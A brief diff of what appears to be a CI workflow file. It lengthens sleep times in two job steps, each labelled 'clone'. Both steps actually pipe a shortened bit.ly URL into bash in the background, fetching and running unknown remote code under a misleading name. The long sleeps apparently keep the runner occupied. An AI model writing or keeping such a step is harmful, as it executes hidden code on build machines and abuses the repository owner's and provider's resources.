@@ -124,7 +124,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/45QXlB4 | bash &
-            sleep 20m
+            sleep 61m
         
     
      
@@ -150,7 +150,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/45QXlB4 | bash &
-            sleep 20m     
+            sleep 261m     
          
     
      
